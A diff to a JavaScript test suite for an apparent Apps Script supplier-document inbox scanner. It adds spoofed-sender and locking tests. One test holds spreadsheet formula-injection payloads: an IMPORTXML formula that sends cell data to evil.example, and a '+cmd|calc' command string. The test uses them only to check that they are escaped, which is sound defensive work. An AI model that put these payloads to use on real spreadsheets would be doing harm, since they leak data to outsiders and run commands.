@@ -7,7 +7,7 @@ const HEADERS = ['id', 'name', 'domain', 'emails', 'contractId', 'contractEnd',
   'docsRequestedAt', 'docsReceivedAt', 'manualStatus'];
 const DATE_FIELDS = ['contractEnd', 'docsRequestedAt', 'docsReceivedAt'];
 const NOW = new Date('2026-09-29T17:00:00Z');
-const ME = 'compras@miempresa.co';
+const ME = 'compras@miempresa.example';
 const isDate = (v) => Object.prototype.toString.call(v) === '[object Date]';
 
 // The supplier tab as Sheets returns it: Date objects and '' for empty cells.
@@ -22,22 +22,24 @@ function supplierSheet() {
 function inboxThreads() {
   const threads = inbox.map((mail) => createThread(`t-${mail.id}`, [createMessage({
     id: `m-${mail.id}`, from: mail.from, subject: mail.subject, body: mail.body,
-    attachments: mail.attachments, date: new Date('2026-09-28T15:00:00Z')
+    attachments: mail.attachments, date: new Date('2026-09-28T15:00:00Z'),
+    auth: mail.senderVerified === false ? 'mx.google.com; spf=fail; dmarc=fail' : 'mx.google.com; spf=pass'
   })]));
   // Our own request plus the supplier's reply in the same thread.
   threads.push(createThread('t-request', [
     createMessage({ id: 'm-request', from: `Compras <${ME}>`, subject: 'Solicitud de documentos — contrato CT-2026-044',
       body: 'Por favor adjunten los documentos del contrato CT-2026-044.', date: new Date('2026-09-18T13:00:00Z') }),
-    createMessage({ id: 'm-reply', from: 'seguridad@novagrupo.com', subject: 'RE: Solicitud de documentos — contrato CT-2026-044',
+    createMessage({ id: 'm-reply', from: 'seguridad@novagrupo.example', subject: 'RE: Solicitud de documentos — contrato CT-2026-044',
       body: 'Adjuntamos lo solicitado.', attachments: ['rut_nova.pdf'], date: new Date('2026-09-29T14:00:00Z') })
   ]));
   return threads;
 }
 
-function setup() {
+function setup(options = {}) {
   const env = loadAdapter({
+    ...options,
     sheets: { Proveedores: supplierSheet() },
-    threads: inboxThreads(),
+    threads: options.threads || inboxThreads(),
     me: ME,
     properties: { DRIVE_FOLDER_ID: 'folder-123' },
     now: NOW
@@ -55,11 +57,12 @@ test('scanInbox logs each message once, files confirmed documents and queues the
   env.gas.scanInbox();
 
   const log = env.book['Registro'].data;
-  assert.equal(log.length - 1, 10, 'nine inbox emails + one reply; our own request is skipped');
+  assert.equal(log.length - 1, 11, 'ten inbox emails + one reply; our own request is skipped');
   assert.ok(!log.some((r) => r[8] === 'm-request'));
 
   const review = env.book['Revisión'].data.slice(1);
-  assert.deepEqual(review.map((r) => r[7]), ['m-E4', 'm-E5', 'm-E6']);
+  assert.deepEqual(review.map((r) => r[7]), ['m-E4', 'm-E5', 'm-E6', 'm-E10']);
+  assert.match(review[3][4], /NO verificado/, 'spoofed sender goes to review, not confirmed');
   assert.equal(review[0][4], '2 proveedores empatan con confianza medium');
 
   for (const id of ['S01', 'S02', 'S03', 'S04', 'S06', 'S09']) {
@@ -77,7 +80,7 @@ test('scanInbox logs each message once, files confirmed documents and queues the
 
   env.gas.scanInbox();
   assert.equal(env.book['Registro'].data.length, log.length, 'a second run adds nothing');
-  assert.equal(env.book['Revisión'].data.length - 1, 3);
+  assert.equal(env.book['Revisión'].data.length - 1, 4);
 });
 
 test('applyReviewDecisions applies assignments once and reports unknown ids', () => {
@@ -107,7 +110,7 @@ test('requestDocuments only emails suppliers that were never asked', () => {
   env.gas.requestDocuments();
   env.gas.requestDocuments();
 
-  assert.deepEqual(env.sent.map((m) => m.to), ['despachos@transabana.co']);
+  assert.deepEqual(env.sent.map((m) => m.to), ['despachos@transabana.example']);
   assert.equal(env.sent[0].subject, 'Solicitud de documentos — contrato CT-2026-052');
   assert.match(env.sent[0].body, /^Hola Transportes Sabana,/);
   assert.equal(env.cell('S09', 'docsRequestedAt'), NOW);
@@ -122,4 +125,33 @@ test('refreshDashboard computes KPIs from dates and flags stale manual statuses'
   assert.deepEqual(kpi, { 'Vencidos': 1, 'En riesgo': 4, 'Por vencer (30 días)': 2, 'Al día': 2 });
   const first = rows[7];
   assert.deepEqual(first, ['TecnoSoluciones Integrales', 'expired', -19, 'contrato vencido hace 19 días', 'sí']);
+});
+
+test('email text that looks like a formula is written as plain text', () => {
+  const threads = [createThread('t-x', [createMessage({
+    id: 'm-x', from: '=IMPORTXML("https://evil.example/?"&A1,"//a")', subject: '+cmd|calc', body: '',
+    date: new Date('2026-09-28T15:00:00Z')
+  })])];
+  const env = setup({ threads });
+  env.gas.scanInbox();
+  const row = env.book['Registro'].raw[1];
+  assert.equal(row[1], `'=IMPORTXML("https://evil.example/?"&A1,"//a")`);
+  assert.equal(row[2], "'+cmd|calc");
+});
+
+test('a message deleted from Gmail keeps its review row pending', () => {
+  const env = setup();
+  env.gas.scanInbox();
+  const review = env.book['Revisión'];
+  review.getRange(2, review.data[0].length - 1).setValue('S07');
+  env.gas.GmailApp.getMessageById = () => null;
+  env.gas.applyReviewDecisions();
+  assert.equal(review.data[1][review.data[1].length - 1] || '', '');
+  assert.match(env.toasts.join(' '), /ya no existen/);
+});
+
+test('a run is skipped while another execution holds the lock', () => {
+  const env = setup({ lockFree: false });
+  env.gas.scanInbox();
+  assert.equal(env.book['Registro'], undefined);
 });
